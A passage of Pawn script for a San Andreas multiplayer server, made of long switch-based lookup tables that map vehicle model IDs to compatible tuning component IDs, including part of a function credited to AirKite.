		}
		case 560:
		{
			switch(componentid)
			{
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1025: { return 1; }
				case 1026: { return 1; }
				case 1027: { return 1; }
				case 1028: { return 1; }
				case 1029: { return 1; }
				case 1030: { return 1; }
				case 1031: { return 1; }
				case 1032: { return 1; }
				case 1033: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1138: { return 1; }
				case 1139: { return 1; }
				case 1140: { return 1; }
				case 1141: { return 1; }
				case 1169: { return 1; }
				case 1170: { return 1; }
			}
		}
		case 561:
		{
			switch(componentid)
			{
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1025: { return 1; }
				case 1055: { return 1; }
				case 1056: { return 1; }
				case 1057: { return 1; }
				case 1058: { return 1; }
				case 1059: { return 1; }
				case 1060: { return 1; }
				case 1061: { return 1; }
				case 1062: { return 1; }
				case 1063: { return 1; }
				case 1064: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1154: { return 1; }
				case 1155: { return 1; }
				case 1156: { return 1; }
				case 1157: { return 1; }
			}
		}
		case 562:
		{
			switch(componentid)
			{
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1025: { return 1; }
				case 1034: { return 1; }
				case 1035: { return 1; }
				case 1036: { return 1; }
				case 1037: { return 1; }
				case 1038: { return 1; }
				case 1039: { return 1; }
				case 1040: { return 1; }
				case 1041: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1146: { return 1; }
				case 1147: { return 1; }
				case 1148: { return 1; }
				case 1149: { return 1; }
				case 1171: { return 1; }
				case 1172: { return 1; }
			}
		}
		case 565:
		{
			switch(componentid)
			{
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1025: { return 1; }
				case 1045: { return 1; }
				case 1046: { return 1; }
				case 1047: { return 1; }
				case 1048: { return 1; }
				case 1049: { return 1; }
				case 1050: { return 1; }
				case 1051: { return 1; }
				case 1052: { return 1; }
				case 1053: { return 1; }
				case 1054: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1150: { return 1; }
				case 1151: { return 1; }
				case 1152: { return 1; }
				case 1153: { return 1; }
			}
		}
		case 567:
		{
			switch(componentid)
			{
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1102: { return 1; }
				case 1129: { return 1; }
				case 1130: { return 1; }
				case 1131: { return 1; }
				case 1132: { return 1; }
				case 1133: { return 1; }
				case 1186: { return 1; }
				case 1187: { return 1; }
				case 1188: { return 1; }
				case 1189: { return 1; }
			}
		}
		case 575:
		{
			switch(componentid)
			{
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1025: { return 1; }
				case 1042: { return 1; }
				case 1043: { return 1; }
				case 1044: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1099: { return 1; }
				case 1174: { return 1; }
				case 1175: { return 1; }
				case 1176: { return 1; }
				case 1177: { return 1; }
			}
		}
		case 576:
		{
			switch(componentid)
			{
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1134: { return 1; }
				case 1135: { return 1; }
				case 1136: { return 1; }
				case 1137: { return 1; }
				case 1190: { return 1; }
				case 1191: { return 1; }
				case 1192: { return 1; }
				case 1193: { return 1; }
			}
		}
		case 580:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1006: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1017: { return 1; }
				case 1018: { return 1; }
				case 1020: { return 1; }
				case 1023: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 585:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1003: { return 1; }
				case 1006: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1013: { return 1; }
				case 1017: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1023: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1142: { return 1; }
				case 1143: { return 1; }
				case 1144: { return 1; }
				case 1145: { return 1; }
			}
		}
		case 589:
		{
			switch(componentid)
			{
				case 1000: { return 1; }
				case 1004: { return 1; }
				case 1005: { return 1; }
				case 1006: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1013: { return 1; }
				case 1016: { return 1; }
				case 1017: { return 1; }
				case 1018: { return 1; }
				case 1020: { return 1; }
				case 1024: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1144: { return 1; }
				case 1145: { return 1; }
			}
		}
		case 600:
		{
			switch(componentid)
			{
				case 1004: { return 1; }
				case 1005: { return 1; }
				case 1006: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1013: { return 1; }
				case 1017: { return 1; }
				case 1018: { return 1; }
				case 1020: { return 1; }
				case 1022: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 603:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1006: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1017: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1023: { return 1; }
				case 1024: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1142: { return 1; }
				case 1143: { return 1; }
				case 1144: { return 1; }
				case 1145: { return 1; }
			}
		}
		case 402,403,406..409,411..414,416,419,423,424,427..429,431..435,437,438,440..445,448,450,451,455..459,461..463,466..468,470,471,474,475,479..486,490,494,495,498,499,502..510,514,515,521..526,528,530..533,541,552,543..545,554..557,566,568,578,571..574,579,581..584,586..588,591,594,596..599,601,602,604..611:
		{
			switch(componentid)
			{
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
	}
	return 0;
}

stock GetVehicleCompatibleUpgrades(model, count, &componentid = 0) // by AirKite
{
	componentid = 0;
	switch(model)
	{
		case 400:
		{
			switch(count)
			{
				case 1: { componentid = 1008; }
				case 2: { componentid = 1009; }
				case 3: { componentid = 1010; }
				case 4: { componentid = 1013; }
				case 5: { componentid = 1018; }
				case 6: { componentid = 1019; }
				case 7: { componentid = 1020; }
				case 8: { componentid = 1021; }
				case 9: { componentid = 1024; }
				case 10: { componentid = 1025; }
				case 11: { componentid = 1073; }
				case 12: { componentid = 1074; }
				case 13: { componentid = 1075; }
				case 14: { componentid = 1076; }
				case 15: { componentid = 1077; }
				case 16: { componentid = 1078; }
				case 17: { componentid = 1079; }
				case 18: { componentid = 1080; }
				case 19: { componentid = 1081; }
				case 20: { componentid = 1082; }
				case 21: { componentid = 1083; }
				case 22: { componentid = 1084; }
				case 23: { componentid = 1085; }
				case 24: { componentid = 1087; }
				case 25: { componentid = 1096; }
				case 26: { componentid = 1097; }
				case 27: { componentid = 1098; }
			}
		}
		case 401:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1003; }
				case 3: { componentid = 1004; }
				case 4: { componentid = 1005; }
				case 5: { componentid = 1006; }
				case 6: { componentid = 1007; }
				case 7: { componentid = 1008; }
				case 8: { componentid = 1009; }
				case 9: { componentid = 1010; }
				case 10: { componentid = 1013; }
				case 11: { componentid = 1017; }
				case 12: { componentid = 1019; }
				case 13: { componentid = 1020; }
				case 14: { componentid = 1025; }
				case 15: { componentid = 1073; }
				case 16: { componentid = 1074; }
				case 17: { componentid = 1075; }
				case 18: { componentid = 1076; }
				case 19: { componentid = 1077; }
				case 20: { componentid = 1078; }
				case 21: { componentid = 1079; }
				case 22: { componentid = 1080; }
				case 23: { componentid = 1081; }
				case 24: { componentid = 1082; }
				case 25: { componentid = 1083; }
				case 26: { componentid = 1084; }
				case 27: { componentid = 1085; }
				case 28: { componentid = 1087; }
				case 29: { componentid = 1096; }
				case 30: { componentid = 1097; }
				case 31: { componentid = 1098; }
				case 32: { componentid = 1142; }
				case 33: { componentid = 1143; }
				case 34: { componentid = 1144; }
			}
		}
		case 404:
		{
			switch(count)
			{
				case 1: { componentid = 1000; }
				case 2: { componentid = 1002; }
				case 3: { componentid = 1007; }
				case 4: { componentid = 1008; }
				case 5: { componentid = 1009; }
				case 6: { componentid = 1010; }
				case 7: { componentid = 1013; }
				case 8: { componentid = 1016; }
				case 9: { componentid = 1017; }
				case 10: { componentid = 1019; }
				case 11: { componentid = 1020; }
				case 12: { componentid = 1021; }
				case 13: { componentid = 1025; }
				case 14: { componentid = 1073; }
				case 15: { componentid = 1074; }
				case 16: { componentid = 1075; }
				case 17: { componentid = 1076; }
				case 18: { componentid = 1077; }
				case 19: { componentid = 1078; }
				case 20: { componentid = 1079; }
				case 21: { componentid = 1080; }
				case 22: { componentid = 1081; }
				case 23: { componentid = 1082; }
				case 24: { componentid = 1083; }
				case 25: { componentid = 1084; }
				case 26: { componentid = 1085; }
				case 27: { componentid = 1087; }
				case 28: { componentid = 1096; }
				case 29: { componentid = 1097; }
				case 30: { componentid = 1098; }
			}
		}
		case 405:
		{
			switch(count)
			{
				case 1: { componentid = 1000; }
				case 2: { componentid = 1001; }
				case 3: { componentid = 1008; }
				case 4: { componentid = 1009; }
				case 5: { componentid = 1010; }
				case 6: { componentid = 1014; }
				case 7: { componentid = 1018; }
				case 8: { componentid = 1019; }
				case 9: { componentid = 1020; }
				case 10: { componentid = 1021; }
				case 11: { componentid = 1023; }
				case 12: { componentid = 1025; }
				case 13: { componentid = 1073; }
				case 14: { componentid = 1074; }
				case 15: { componentid = 1075; }
				case 16: { componentid = 1076; }
				case 17: { componentid = 1077; }
				case 18: { componentid = 1078; }
				case 19: { componentid = 1079; }
				case 20: { componentid = 1080; }
				case 21: { componentid = 1081; }
				case 22: { componentid = 1082; }
				case 23: { componentid = 1083; }
				case 24: { componentid = 1084; }
				case 25: { componentid = 1085; }
				case 26: { componentid = 1087; }
				case 27: { componentid = 1096; }
				case 28: { componentid = 1097; }
				case 29: { componentid = 1098; }
			}
		}
		case 410:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1003; }
				case 3: { componentid = 1007; }
				case 4: { componentid = 1008; }
				case 5: { componentid = 1009; }
				case 6: { componentid = 1010; }
				case 7: { componentid = 1013; }
				case 8: { componentid = 1017; }
				case 9: { componentid = 1019; }
				case 10: { componentid = 1020; }
				case 11: { componentid = 1021; }
				case 12: { componentid = 1023; }
				case 13: { componentid = 1024; }
				case 14: { componentid = 1025; }
				case 15: { componentid = 1073; }
				case 16: { componentid = 1074; }
				case 17: { componentid = 1075; }
				case 18: { componentid = 1076; }
				case 19: { componentid = 1077; }
				case 20: { componentid = 1078; }
				case 21: { componentid = 1079; }
				case 22: { componentid = 1080; }
				case 23: { componentid = 1081; }
				case 24: { componentid = 1082; }
				case 25: { componentid = 1083; }
				case 26: { componentid = 1084; }
				case 27: { componentid = 1085; }
				case 28: { componentid = 1087; }
				case 29: { componentid = 1096; }
				case 30: { componentid = 1097; }
				case 31: { componentid = 1098; }
			}
		}
		case 415:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1003; }
				case 3: { componentid = 1007; }
				case 4: { componentid = 1008; }
				case 5: { componentid = 1009; }
				case 6: { componentid = 1010; }
				case 7: { componentid = 1017; }
				case 8: { componentid = 1018; }
				case 9: { componentid = 1019; }
				case 10: { componentid = 1023; }
				case 11: { componentid = 1025; }
				case 12: { componentid = 1073; }
				case 13: { componentid = 1074; }
				case 14: { componentid = 1075; }
				case 15: { componentid = 1076; }
				case 16: { componentid = 1077; }
				case 17: { componentid = 1078; }
				case 18: { componentid = 1079; }
				case 19: { componentid = 1080; }
				case 20: { componentid = 1081; }
				case 21: { componentid = 1082; }
				case 22: { componentid = 1083; }
				case 23: { componentid = 1084; }
				case 24: { componentid = 1085; }
				case 25: { componentid = 1087; }
				case 26: { componentid = 1096; }
				case 27: { componentid = 1097; }
				case 28: { componentid = 1098; }
			}
		}
		case 418:
		{
			switch(count)
			{
				case 1: { componentid = 1002; }
				case 2: { componentid = 1006; }
				case 3: { componentid = 1008; }
				case 4: { componentid = 1009; }
				case 5: { componentid = 1010; }
				case 6: { componentid = 1016; }
				case 7: { componentid = 1020; }
				case 8: { componentid = 1021; }
				case 9: { componentid = 1025; }
				case 10: { componentid = 1073; }
				case 11: { componentid = 1074; }
				case 12: { componentid = 1075; }
				case 13: { componentid = 1076; }
				case 14: { componentid = 1077; }
				case 15: { componentid = 1078; }
				case 16: { componentid = 1079; }
				case 17: { componentid = 1080; }
				case 18: { componentid = 1081; }
				case 19: { componentid = 1082; }
				case 20: { componentid = 1083; }
				case 21: { componentid = 1084; }
				case 22: { componentid = 1085; }
				case 23: { componentid = 1087; }
				case 24: { componentid = 1096; }
				case 25: { componentid = 1097; }
				case 26: { componentid = 1098; }
			}
		}
		case 420:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1003; }
				case 3: { componentid = 1004; }
				case 4: { componentid = 1005; }
				case 5: { componentid = 1008; }
				case 6: { componentid = 1009; }
				case 7: { componentid = 1010; }
				case 8: { componentid = 1019; }
				case 9: { componentid = 1021; }
				case 10: { componentid = 1025; }
				case 11: { componentid = 1073; }
				case 12: { componentid = 1074; }
				case 13: { componentid = 1075; }
				case 14: { componentid = 1076; }
				case 15: { componentid = 1077; }
				case 16: { componentid = 1078; }
				case 17: { componentid = 1079; }
				case 18: { componentid = 1080; }
				case 19: { componentid = 1081; }
				case 20: { componentid = 1082; }
				case 21: { componentid = 1083; }
				case 22: { componentid = 1084; }
				case 23: { componentid = 1085; }
				case 24: { componentid = 1087; }
				case 25: { componentid = 1096; }
				case 26: { componentid = 1097; }
				case 27: { componentid = 1098; }
			}
		}
		case 421:
		{
			switch(count)
			{
				case 1: { componentid = 1000; }
				case 2: { componentid = 1008; }
				case 3: { componentid = 1009; }
				case 4: { componentid = 1010; }
				case 5: { componentid = 1014; }
				case 6: { componentid = 1016; }
				case 7: { componentid = 1018; }
				case 8: { componentid = 1019; }
				case 9: { componentid = 1020; }
				case 10: { componentid = 1021; }
				case 11: { componentid = 1023; }
				case 12: { componentid = 1025; }
				case 13: { componentid = 1073; }
				case 14: { componentid = 1074; }
				case 15: { componentid = 1075; }
				case 16: { componentid = 1076; }
				case 17: { componentid = 1077; }
				case 18: { componentid = 1078; }
				case 19: { componentid = 1079; }
				case 20: { componentid = 1080; }
				case 21: { componentid = 1081; }
				case 22: { componentid = 1082; }
				case 23: { componentid = 1083; }
				case 24: { componentid = 1084; }
				case 25: { componentid = 1085; }
				case 26: { componentid = 1087; }
				case 27: { componentid = 1096; }
				case 28: { componentid = 1097; }
				case 29: { componentid = 1098; }
			}
		}
		case 422:
		{
			switch(count)
			{
				case 1: { componentid = 1007; }
				case 2: { componentid = 1008; }
				case 3: { componentid = 1009; }
				case 4: { componentid = 1010; }
				case 5: { componentid = 1013; }
				case 6: { componentid = 1017; }
				case 7: { componentid = 1019; }
				case 8: { componentid = 1020; }
				case 9: { componentid = 1021; }
				case 10: { componentid = 1025; }
				case 11: { componentid = 1073; }
				case 12: { componentid = 1074; }
				case 13: { componentid = 1075; }
				case 14: { componentid = 1076; }
				case 15: { componentid = 1077; }
				case 16: { componentid = 1078; }
				case 17: { componentid = 1079; }
				case 18: { componentid = 1080; }
				case 19: { componentid = 1081; }
				case 20: { componentid = 1082; }
				case 21: { componentid = 1083; }
				case 22: { componentid = 1084; }
				case 23: { componentid = 1085; }
				case 24: { componentid = 1087; }
				case 25: { componentid = 1096; }
				case 26: { componentid = 1097; }
				case 27: { componentid = 1098; }
			}
		}
		case 426:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1003; }
				case 3: { componentid = 1004; }
				case 4: { componentid = 1005; }
				case 5: { componentid = 1006; }
				case 6: { componentid = 1008; }
				case 7: { componentid = 1009; }
				case 8: { componentid = 1010; }
				case 9: { componentid = 1019; }
				case 10: { componentid = 1021; }
				case 11: { componentid = 1025; }
				case 12: { componentid = 1073; }
				case 13: { componentid = 1074; }
				case 14: { componentid = 1075; }
				case 15: { componentid = 1076; }
				case 16: { componentid = 1077; }
				case 17: { componentid = 1078; }
				case 18: { componentid = 1079; }
				case 19: { componentid = 1080; }
				case 20: { componentid = 1081; }
				case 21: { componentid = 1082; }
				case 22: { componentid = 1083; }
				case 23: { componentid = 1084; }
				case 24: { componentid = 1085; }
				case 25: { componentid = 1087; }
				case 26: { componentid = 1096; }
				case 27: { componentid = 1097; }
				case 28: { componentid = 1098; }
			}
		}
		case 436:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1003; }
				case 3: { componentid = 1006; }
				case 4: { componentid = 1007; }
				case 5: { componentid = 1008; }
				case 6: { componentid = 1009; }
				case 7: { componentid = 1010; }
				case 8: { componentid = 1013; }
				case 9: { componentid = 1017; }
				case 10: { componentid = 1019; }
				case 11: { componentid = 1020; }
				case 12: { componentid = 1021; }
				case 13: { componentid = 1022; }
				case 14: { componentid = 1025; }
				case 15: { componentid = 1073; }
				case 16: { componentid = 1074; }
				case 17: { componentid = 1075; }
				case 18: { componentid = 1076; }
				case 19: { componentid = 1077; }
				case 20: { componentid = 1078; }
				case 21: { componentid = 1079; }
				case 22: { componentid = 1080; }
				case 23: { componentid = 1081; }
				case 24: { componentid = 1082; }
				case 25: { componentid = 1083; }
				case 26: { componentid = 1084; }
				case 27: { componentid = 1085; }
				case 28: { componentid = 1087; }
				case 29: { componentid = 1096; }
				case 30: { componentid = 1097; }
				case 31: { componentid = 1098; }
			}
		}
		case 439:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1003; }
				case 3: { componentid = 1007; }
				case 4: { componentid = 1008; }
				case 5: { componentid = 1009; }
				case 6: { componentid = 1010; }
				case 7: { componentid = 1013; }
				case 8: { componentid = 1017; }
				case 9: { componentid = 1023; }
				case 10: { componentid = 1025; }
				case 11: { componentid = 1073; }
				case 12: { componentid = 1074; }
				case 13: { componentid = 1075; }
				case 14: { componentid = 1076; }
				case 15: { componentid = 1077; }
				case 16: { componentid = 1078; }
				case 17: { componentid = 1079; }
				case 18: { componentid = 1080; }
				case 19: { componentid = 1081; }
				case 20: { componentid = 1082; }
				case 21: { componentid = 1083; }
				case 22: { componentid = 1084; }
				case 23: { componentid = 1085; }
				case 24: { componentid = 1087; }
				case 25: { componentid = 1096; }
				case 26: { componentid = 1097; }
				case 27: { componentid = 1098; }
				case 28: { componentid = 1142; }
				case 29: { componentid = 1143; }
				case 30: { componentid = 1144; }
				case 31: { componentid = 1145; }
			}
		}
		case 477:
		{
			switch(count)
			{
				case 1: { componentid = 1006; }
				case 2: { componentid = 1007; }
				case 3: { componentid = 1008; }
				case 4: { componentid = 1009; }
				case 5: { componentid = 1010; }
				case 6: { componentid = 1017; }
				case 7: { componentid = 1018; }
				case 8: { componentid = 1019; }
				case 9: { componentid = 1020; }
				case 10: { componentid = 1021; }
				case 11: { componentid = 1025; }
				case 12: { componentid = 1073; }
				case 13: { componentid = 1074; }
				case 14: { componentid = 1075; }
				case 15: { componentid = 1076; }
				case 16: { componentid = 1077; }
				case 17: { componentid = 1078; }
				case 18: { componentid = 1079; }
				case 19: { componentid = 1080; }
				case 20: { componentid = 1081; }
				case 21: { componentid = 1082; }
				case 22: { componentid = 1083; }
				case 23: { componentid = 1084; }
				case 24: { componentid = 1085; }
				case 25: { componentid = 1087; }
				case 26: { componentid = 1096; }
				case 27: { componentid = 1097; }
				case 28: { componentid = 1098; }
			}
		}
		case 478:
		{
			switch(count)
			{
				case 1: { componentid = 1004; }
				case 2: { componentid = 1005; }
				case 3: { componentid = 1008; }
				case 4: { componentid = 1009; }
				case 5: { componentid = 1010; }
				case 6: { componentid = 1012; }
				case 7: { componentid = 1013; }
				case 8: { componentid = 1020; }
				case 9: { componentid = 1021; }
				case 10: { componentid = 1022; }
				case 11: { componentid = 1024; }
				case 12: { componentid = 1025; }
				case 13: { componentid = 1073; }
				case 14: { componentid = 1074; }
				case 15: { componentid = 1075; }
				case 16: { componentid = 1076; }
				case 17: { componentid = 1077; }
				case 18: { componentid = 1078; }
				case 19: { componentid = 1079; }
				case 20: { componentid = 1080; }
				case 21: { componentid = 1081; }
				case 22: { componentid = 1082; }
				case 23: { componentid = 1083; }
				case 24: { componentid = 1084; }
				case 25: { componentid = 1085; }
				case 26: { componentid = 1087; }
				case 27: { componentid = 1096; }
				case 28: { componentid = 1097; }
				case 29: { componentid = 1098; }
			}
		}
		case 489:
		{
			switch(count)
			{
				case 1: { componentid = 1000; }
				case 2: { componentid = 1002; }
				case 3: { componentid = 1004; }
				case 4: { componentid = 1005; }
				case 5: { componentid = 1006; }
				case 6: { componentid = 1008; }
				case 7: { componentid = 1009; }
				case 8: { componentid = 1010; }
				case 9: { componentid = 1013; }
				case 10: { componentid = 1016; }
				case 11: { componentid = 1018; }
				case 12: { componentid = 1019; }
				case 13: { componentid = 1020; }
				case 14: { componentid = 1024; }
				case 15: { componentid = 1025; }
				case 16: { componentid = 1073; }
				case 17: { componentid = 1074; }
				case 18: { componentid = 1075; }
				case 19: { componentid = 1076; }
				case 20: { componentid = 1077; }
				case 21: { componentid = 1078; }
				case 22: { componentid = 1079; }
				case 23: { componentid = 1080; }
				case 24: { componentid = 1081; }
				case 25: { componentid = 1082; }
				case 26: { componentid = 1083; }
				case 27: { componentid = 1084; }
				case 28: { componentid = 1085; }
				case 29: { componentid = 1087; }
				case 30: { componentid = 1096; }
				case 31: { componentid = 1097; }
				case 32: { componentid = 1098; }
			}
		}
		case 491:
		{
			switch(count)
			{
				case 1: { componentid = 1003; }
				case 2: { componentid = 1007; }
				case 3: { componentid = 1008; }
				case 4: { componentid = 1009; }
				case 5: { componentid = 1010; }
				case 6: { componentid = 1014; }
				case 7: { componentid = 1017; }
				case 8: { componentid = 1018; }
				case 9: { componentid = 1019; }
				case 10: { componentid = 1020; }
				case 11: { componentid = 1021; }
				case 12: { componentid = 1023; }
				case 13: { componentid = 1025; }
				case 14: { componentid = 1073; }
				case 15: { componentid = 1074; }
				case 16: { componentid = 1075; }
				case 17: { componentid = 1076; }
				case 18: { componentid = 1077; }
				case 19: { componentid = 1078; }
				case 20: { componentid = 1079; }
				case 21: { componentid = 1080; }
				case 22: { componentid = 1081; }
				case 23: { componentid = 1082; }
				case 24: { componentid = 1083; }
				case 25: { componentid = 1084; }
				case 26: { componentid = 1085; }
				case 27: { componentid = 1087; }
				case 28: { componentid = 1096; }
				case 29: { componentid = 1097; }
				case 30: { componentid = 1098; }
				case 31: { componentid = 1142; }
				case 32: { componentid = 1143; }
				case 33: { componentid = 1144; }
				case 34: { componentid = 1145; }
			}
		}
		case 492:
		{
			switch(count)
			{
				case 1: { componentid = 1000; }
				case 2: { componentid = 1004; }
				case 3: { componentid = 1005; }
				case 4: { componentid = 1006; }
				case 5: { componentid = 1008; }
				case 6: { componentid = 1009; }
				case 7: { componentid = 1010; }
				case 8: { componentid = 1016; }
				case 9: { componentid = 1025; }
				case 10: { componentid = 1073; }
				case 11: { componentid = 1074; }
				case 12: { componentid = 1075; }
				case 13: { componentid = 1076; }
				case 14: { componentid = 1077; }
				case 15: { componentid = 1078; }
				case 16: { componentid = 1079; }
				case 17: { componentid = 1080; }
				case 18: { componentid = 1081; }
				case 19: { componentid = 1082; }
				case 20: { componentid = 1083; }
				case 21: { componentid = 1084; }
				case 22: { componentid = 1085; }
				case 23: { componentid = 1087; }
				case 24: { componentid = 1096; }
				case 25: { componentid = 1097; }
				case 26: { componentid = 1098; }
			}
		}
		case 496:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1002; }
				case 3: { componentid = 1003; }
				case 4: { componentid = 1006; }
				case 5: { componentid = 1007; }
				case 6: { componentid = 1008; }
				case 7: { componentid = 1009; }
				case 8: { componentid = 1010; }
				case 9: { componentid = 1011; }
				case 10: { componentid = 1017; }
				case 11: { componentid = 1019; }
				case 12: { componentid = 1020; }
